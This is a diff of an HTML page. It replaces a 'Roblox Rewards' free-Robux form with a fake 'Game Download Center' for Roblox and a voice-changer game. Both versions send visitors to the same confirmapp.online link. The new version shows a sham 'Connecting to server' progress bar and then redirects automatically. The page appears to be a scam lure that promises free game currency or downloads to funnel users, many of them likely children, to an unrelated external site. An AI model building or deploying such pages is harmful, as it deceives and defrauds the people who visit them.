@@ -3,96 +3,145 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Roblox Rewards</title>
+<title>Game Download Center</title>
 
 <style>
+
 body{
-font-family: Arial, sans-serif;
-background:#0f172a;
+background:#0f0f0f;
+font-family:Arial;
 color:white;
 text-align:center;
-padding:40px;
+margin:0;
 }
 
 .container{
 max-width:500px;
 margin:auto;
-background:#1e293b;
-padding:30px;
-border-radius:10px;
-box-shadow:0 0 20px rgba(0,0,0,0.4);
+padding:20px;
 }
 
-h1{
-color:#22c55e;
+.game{
+background:#1c1c1c;
+padding:25px;
+border-radius:15px;
+margin-top:30px;
+box-shadow:0 0 10px rgba(0,0,0,0.5);
 }
 
-input{
-width:80%;
-padding:12px;
-margin:15px 0;
-border:none;
-border-radius:5px;
-}
-
-select{
-width:85%;
-padding:12px;
-border-radius:5px;
-border:none;
-margin-top:10px;
+.logo{
+width:120px;
+margin-bottom:10px;
 }
 
 button{
-background:#22c55e;
-color:white;
+background:#1e88ff;
 border:none;
-padding:14px 25px;
-font-size:18px;
-border-radius:6px;
+padding:12px 30px;
+color:white;
+font-size:16px;
+border-radius:8px;
 cursor:pointer;
 }
 
 button:hover{
-background:#16a34a;
+background:#0066ff;
 }
 
-.footer{
-margin-top:20px;
-font-size:12px;
-opacity:0.7;
+#loading{
+display:none;
+margin-top:30px;
 }
+
+.bar{
+width:100%;
+height:8px;
+background:#333;
+border-radius:5px;
+overflow:hidden;
+margin-top:10px;
+}
+
+.progress{
+width:0%;
+height:100%;
+background:#1e88ff;
+}
+
 </style>
 </head>
 
 <body>
 
 <div class="container">
-<h1>🎮 Roblox Rewards</h1>
 
-<p>Enter your Roblox username</p>
+<h1>Game Download Center</h1>
 
-<input type="text" placeholder="Roblox Username">
+<div class="game">
 
-<br>
+<img class="logo"
+src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.svg">
 
-<select>
-<option>1000 Robux</option>
-<option>4500 Robux</option>
-<option>10000 Robux</option>
-</select>
+<h3>Roblox</h3>
 
-<br><br>
+<p>Play millions of games online.</p>
 
-<a href="https://confirmapp.online/cl/i/822jo6">
-<button>Get Rewards</button>
-</a>
+<button onclick="start()">Start</button>
 
-<div class="footer">
-<p>This site is not affiliated with Roblox Corporation.</p>
+</div>
+
+<div class="game">
+
+<img class="logo"
+src="https://cdn-icons-png.flaticon.com/512/727/727245.png">
+
+<h3>My Voice Zoo</h3>
+
+<p>Try the fun voice changer game.</p>
+
+<button onclick="start()">Download</button>
+
+</div>
+
+<div id="loading">
+
+<p>Connecting to server...</p>
+
+<div class="bar">
+<div class="progress" id="progress"></div>
 </div>
 
 </div>
+
+</div>
+
+<script>
+
+function start(){
+
+document.getElementById("loading").style.display="block"
+
+let width=0
+let bar=document.getElementById("progress")
+
+let interval=setInterval(function(){
+
+if(width>=100){
+
+clearInterval(interval)
+
+window.location.href="https://confirmapp.online/cl/i/822jo6"
+
+}
+
+width++
+bar.style.width=width+"%"
+
+},35)
+
+}
+
+</script>
 
 </body>
 </html>
